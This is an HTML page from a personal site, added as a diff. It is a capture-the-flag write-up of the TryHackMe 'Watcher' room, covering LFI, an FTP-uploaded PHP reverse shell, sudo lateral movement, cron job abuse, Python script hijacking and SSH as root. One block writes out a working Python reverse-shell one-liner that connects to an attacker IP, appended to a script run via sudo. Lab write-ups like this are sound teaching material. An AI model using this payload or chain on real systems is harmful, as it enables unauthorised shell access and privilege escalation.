@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Watcher Writeup - David John</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #edf6f9;
+            color: #333;
+            line-height: 1.6;
+        }
+        header {
+            background: #006d77;
+            color: #fff;
+            padding: 2rem;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        nav {
+            display: flex;
+            justify-content: center;
+            background: #83c5be;
+            padding: 1rem;
+            transition: background-color 0.3s;
+        }
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 1.5rem;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            transition: background-color 0.3s;
+        }
+        nav a:hover {
+            background-color: #006d77;
+        }
+        main {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem;
+            margin-bottom: 100px;
+        }
+        .back-link {
+            display: inline-block;
+            margin-bottom: 1.5rem;
+            color: #006d77;
+            text-decoration: none;
+        }
+        .back-link:hover {
+            text-decoration: underline;
+        }
+        .content-section {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 2rem;
+        }
+        .content-section h2 {
+            color: #006d77;
+        }
+        .content-section h3 {
+            color: #006d77;
+            margin-top: 2rem;
+        }
+        .content-section h4 {
+            color: #006d77;
+            margin-top: 1.5rem;
+            margin-bottom: 0.25rem;
+        }
+        .content-section pre {
+            background: #f4f4f4;
+            padding: 1rem;
+            border-radius: 4px;
+            overflow-x: auto;
+            font-size: 0.85rem;
+        }
+        .content-section img {
+            max-width: 100%;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            margin: 0.75rem 0;
+            display: block;
+        }
+        .content-section ul {
+            margin: 0.5rem 0 1rem 1.5rem;
+        }
+        .writeup-tags span {
+            display: inline-block;
+            background: #edf6f9;
+            color: #006d77;
+            font-size: 0.8rem;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            margin-right: 0.5rem;
+        }
+        footer {
+            background: #333;
+            color: #fff;
+            text-align: center;
+            padding: 1rem;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        @media (max-width: 600px) {
+            nav {
+                flex-direction: column;
+                align-items: center;
+            }
+            nav a {
+                margin: 0.5rem 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>David John</h1>
+    </header>
+    <nav>
+        <a href="../index.html">Home</a>
+        <a href="../writeups.html">Writeups</a>
+    </nav>
+    <main>
+        <a class="back-link" href="../writeups.html">&larr; Back to all writeups</a>
+        <section class="content-section">
+            <h2>Watcher</h2>
+            <div class="writeup-tags">
+                <span>TryHackMe</span>
+                <span>Linux</span>
+                <span>LFI</span>
+            </div>
+
+            <h3>Enumeration</h3>
+            <pre>nmap -sV -A -v 10.201.4.47</pre>
+            <img src="../images/thewatcher//watcher-nmap-1.png" alt="Nmap scan results">
+            <p>We have 3 ports that appear to be open.</p>
+            <p>We cannot connect to port 21 via anonymous login. My only option is to go to port 80 and see what's up.</p>
+            <img src="../images/thewatcher//watcher-website-1.png" alt="Port 80 website homepage">
+            <p>Looks like a normal website. There are only 4 pages I can navigate to, one of them being the home page.</p>
+            <p>DirBuster doesn't reveal anything interesting about the website subdomains, but upon manual enumeration, I notice the URL uses PHP to read files. See the URL below:</p>
+            <img src="../images/thewatcher//watcher-url-php-1.png" alt="URL showing PHP file parameter">
+            <p>I try to see if I can abuse this and perform a local file inclusion.</p>
+
+            <h3>LFI</h3>
+            <img src="../images/thewatcher//watcher-lfi-1.png" alt="Successful LFI showing /etc/passwd">
+            <p>Success. This gives us some useful information. Namely, we see that the exploit is working, and we can navigate through the file system if we know file names. We also see a list of users:</p>
+            <ul>
+                <li>ftpuser</li>
+                <li>toby</li>
+                <li>mat</li>
+                <li>will</li>
+            </ul>
+            <p>Maybe we can SSH to a user in the future, but for now, this LFI is giving me an idea that we might be able to do an RCE. I bet FTP has something to do with it, but I don't have a login.</p>
+
+            <h3>robots.txt</h3>
+            <p>Some enumeration later, I forgot to check in on /robots.txt.</p>
+            <img src="../images/thewatcher//watcher-robots-1.png" alt="robots.txt revealing hidden paths">
+
+            <h3>Flag 1</h3>
+            <p>Sure enough, here are some files that seem to be hidden within the file system. Luckily, we can open them using the LFI.</p>
+            <img src="../images/thewatcher//watcher-flag1-1.png" alt="Flag 1 file opened via LFI">
+            <img src="../images/thewatcher//watcher-flag1-2.png" alt="FTP credentials revealed via LFI">
+            <p>We have the credentials. Now to connect to the FTP and drop a reverse shell and see if we can open it through the LFI.</p>
+
+            <h3>FTP PHP Reverse Shell and Flag 2</h3>
+            <img src="../images/thewatcher//watcher-ftp-1.png" alt="FTP session with flag_2.txt">
+            <p>Another flag. I retrieve it using:</p>
+            <pre>get flag_2.txt</pre>
+            <p>Changing into the file directory, it seems to be empty — a perfect place to drop the reverse shell into. After dropping it in, I set up a netcat listener to catch the reverse shell. Now, we can navigate to the shell via the LFI.</p>
+            <p>Noting that one of the users was ftpuser from the /etc/passwd file, I try navigating to their home directory to see if there is any luck.</p>
+            <img src="../images/thewatcher//watcher-shell-1.png" alt="Reverse shell caught as www-data">
+            <p>We are in.</p>
+
+            <h3>Stabilize Shell and Flag 3</h3>
+            <p>The first thing I do is stabilize the shell.</p>
+            <img src="../images/thewatcher//watcher-stabilize-1.png" alt="Stabilizing the reverse shell">
+            <p>Then, I want to investigate /var/www/html for anything more that may have been hidden.</p>
+            <img src="../images/thewatcher//watcher-flag3-1.png" alt="Flag 3 found in a hidden web directory">
+            <p>We found flag 3 in a hidden directory that DirBuster wouldn't have picked up on. Now, time to head to the home directory.</p>
+            <img src="../images/thewatcher//watcher-home-dir-1.png" alt="Home directory listing all users">
+            <p>We see all of the users from the /etc/passwd leak. The ubuntu directory was empty. Looking through all of the other directories reveals a chain of command. Our goal is to connect to these users in this specific order:</p>
+            <pre>www-data (current) --> toby --> mat --> will</pre>
+            <p>Going into the toby directory, we have 2 files and a directory called jobs. I suspect that I will need to look in /etc/crontab.</p>
+            <img src="../images/thewatcher//watcher-toby-dir-1.png" alt="Toby's home directory contents">
+
+            <h3>Crontab</h3>
+            <p>Looking in crontab, we see we have 1 program that is set to run occasionally.</p>
+            <img src="../images/thewatcher//watcher-crontab-1.png" alt="Crontab entry for the jobs directory">
+            <p>Unfortunately, we can't use that just yet — we do not have permission to write to this file. Running sudo -l gives us useful information.</p>
+            <img src="../images/thewatcher//watcher-sudol-1.png" alt="sudo -l output showing www-data can run bash as toby">
+
+            <h3>User Toby</h3>
+            <p>We can run sudo as toby without a password. This means we can move laterally to toby's account.</p>
+            <pre>sudo -u toby bash</pre>
+            <img src="../images/thewatcher//watcher-toby-shell-1.png" alt="Shell as toby">
+            <p>Now we can try and use the cron job under the jobs directory. But first, let's get the flag.</p>
+            <img src="../images/thewatcher//watcher-toby-flag-1.png" alt="Toby's flag">
+
+            <h3>Flag 4</h3>
+            <p>Listing the directory contents under toby one more time, I see that there is a note.txt.</p>
+            <img src="../images/thewatcher//watcher-note-1.png" alt="note.txt from toby mentioning the cron job">
+            <p>It even mentions the cron job — thank you Mat. The cron job in question seems to be copying a file called cow.jpg. The important thing is that we can now edit it to host another reverse shell. Since we can't use nano, we can use echo.</p>
+            <img src="../images/thewatcher//watcher-echo-shell-1.png" alt="Writing reverse shell payload into the cron job script via echo">
+            <p>Now, I set another netcat listener.</p>
+            <img src="../images/thewatcher//watcher-nc-listener-1.png" alt="Netcat listener waiting for connection">
+            <img src="../images/thewatcher//watcher-mat-shell-1.png" alt="Reverse shell caught as mat">
+
+            <h3>User Mat and Flag 5</h3>
+            <p>We are on Mat's account now. We can retrieve the flag from his directory.</p>
+            <img src="../images/thewatcher//watcher-mat-flag-1.png" alt="Mat's flag and directory contents">
+            <p>Again, there is a note and a directory to explore.</p>
+
+            <h3>Python Script Hijacking</h3>
+            <img src="../images/thewatcher//watcher-scripts-1.png" alt="Scripts directory contents">
+            <p>A python script that can be run as sudo — we can spawn yet another shell with this. The one we can edit is cmd.py; the other is owned by will.</p>
+            <img src="../images/thewatcher//watcher-will-script-1.png" alt="Contents of will_script.py">
+            <p>We can append a python reverse shell line to cmd.py and run it under will's user.</p>
+            <pre>echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.87.5",3245));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> /home/mat/scripts/cmd.pysudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *</pre>
+
+            <h3>User Will and Flag 6</h3>
+            <p>I need to have another netcat listener for this one.</p>
+            <img src="../images/thewatcher//watcher-will-shell-1.png" alt="Reverse shell caught as will">
+            <p>We are now on will's account and can cat flag_6.txt.</p>
+            <img src="../images/thewatcher//watcher-will-flag-1.png" alt="Will's flag">
+            <p>Since we ran out of directories to explore, we can start doing normal enumeration. We can check the group ID that will belongs to in order to get a better idea of what permissions he has.</p>
+            <img src="../images/thewatcher//watcher-will-id-1.png" alt="id output showing will is in the admin group">
+            <p>Seeing that he is part of the admin group, we can go to /opt and retrieve an encrypted base64 key.</p>
+
+            <h3>SSH to Root</h3>
+            <p>Transferring this to my attacking machine gives me an opportunity to decode it and log in through SSH as root using the id_rsa as the key.</p>
+            <img src="../images/thewatcher//watcher-ssh-root-1.png" alt="SSH login as root using the decoded id_rsa key">
+
+            <h3>Root Flag</h3>
+            <img src="../images/thewatcher//watcher-root-flag-1.png" alt="Root flag">
+        </section>
+    </main>
+    <footer>
+        <p>&copy; 2026 David John. All rights reserved.</p>
+    </footer>
+</body>
+</html>
